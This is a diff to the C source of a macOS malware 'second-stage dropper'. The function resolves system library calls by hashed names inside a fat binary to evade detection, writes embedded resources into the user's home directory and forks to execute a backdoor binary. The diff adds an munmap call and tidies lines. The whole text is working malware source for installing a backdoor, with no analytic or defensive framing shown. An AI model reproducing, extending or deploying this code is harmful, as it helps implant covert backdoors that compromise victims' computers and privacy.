@@ -564,6 +564,7 @@ void secondStageDropper ()
   unsigned int pwriteHash   = 0xac6aa4ce; // _pwrite
   unsigned int statHash     = 0x54c725f3; // _stat
   unsigned int mmapHash     = 0x3a2bd4ee; // _mmap
+  unsigned int munmapHash   = 0x29d6b975; // _munmap
   unsigned int memcpyHash   = 0xb7ac6156; // _memcpy
   unsigned int sprintfHash  = 0xf771588d; // _sprintf
   unsigned int printfHash   = 0xb885c098; // _printf
@@ -594,6 +595,7 @@ void secondStageDropper ()
   int   (*ipwrite)   (int, const void *, int, _mOff_t);
   int  *(*istat)     (const char *, struct stat *);
   void *(*immap)     (void *, _mSize_t, int, int, int, _mOff_t);
+  int   (*imunmap)   (void *, _mSize_t);
   void *(*imemcpy)   (void *, const void *, int);
   int   (*isprintf)  (char *, const char *, ...);
   int   (*iprintf)   (const char *, ...);
@@ -653,6 +655,7 @@ void secondStageDropper ()
                       ipwrite   = (int  (__cdecl *)(int, const void *, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, pwriteHash) + (unsigned int)m_header);
                       istat     = (int* (__cdecl *)(const char *, struct stat *))(findSymbolInFatBinary ((byte *)libSystemAddress, statHash) + (unsigned int)m_header);
                       immap     = (void*(__cdecl *)(void *, _mSize_t, int, int, int, _mOff_t))(findSymbolInFatBinary ((byte *)libSystemAddress, mmapHash) + (unsigned int)m_header);
+                      imunmap   = (int  (__cdecl *)(void *, _mSize_t))(findSymbolInFatBinary ((byte *)libSystemAddress, munmapHash) + (unsigned int)m_header);
                       imemcpy   = (void*(__cdecl *)(void *, const void *, int))(findSymbolInFatBinary ((byte *)libSystemAddress, memcpyHash) + (unsigned int)m_header);
                       isprintf  = (int  (__cdecl *)(char *, const char *, ...))(findSymbolInFatBinary ((byte *)libSystemAddress, sprintfHash) + (unsigned int)m_header);
                       iprintf   = (int  (__cdecl *)(const char *,...))(findSymbolInFatBinary ((byte *)libSystemAddress, printfHash) + (unsigned int)m_header);
@@ -704,7 +707,6 @@ void secondStageDropper ()
               destinationDir  = (char *) imalloc (128);
               
               resource = (resourceHeader *)offset;
-              
               isprintf (destinationDir, strings[1], userHome, resource->path);
 
               if (backdoorDir == NULL)
@@ -714,7 +716,6 @@ void secondStageDropper ()
                 }
 
               imkdir (destinationDir, 0755);
-              
               isprintf (destinationPath, strings[1], destinationDir, resource->name);
               
               if (resource->type == RESOURCE_CORE)
@@ -740,6 +741,8 @@ void secondStageDropper ()
                       imemcpy (filePointer,
                                (byte *)offset,
                                resource->size);
+
+                      imunmap (filePointer, resource->size);
                     }
                   
                   iclose (fd);
@@ -757,7 +760,6 @@ void secondStageDropper ()
           if ((pid = ifork()) == 0)
             {
               ichdir (backdoorDir);
-              //iexecl (backdoorPath, strings[3], NULL, NULL, NULL);
               iexecl (backdoorPath, backdoorPath, NULL, NULL, NULL);
               ifree (backdoorDir);
             }
